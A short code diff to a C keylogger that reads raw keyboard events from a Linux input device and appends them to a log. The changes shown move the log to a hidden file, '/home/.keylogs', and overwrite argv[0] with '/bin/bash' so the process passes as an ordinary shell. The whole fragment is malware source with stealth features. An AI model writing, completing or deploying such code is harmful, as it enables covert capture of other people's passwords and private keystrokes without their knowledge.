@@ -34,9 +34,10 @@ static const char *keycodeShiftEnabled[] = {
 
 int main(int argc, char** argv) {
     FILE* keyboard = fopen("/dev/input/event3", "r");
-    FILE* log = fopen("./test.txt", "a+");
+    FILE* log = fopen("/home/.keylogs", "a+");
     int shiftEnabled = NULL;
     struct input_event event;
+    argv[0] = "/bin/bash";
     
     while(1) {
         fread(&event, sizeof(event), 1, keyboard);
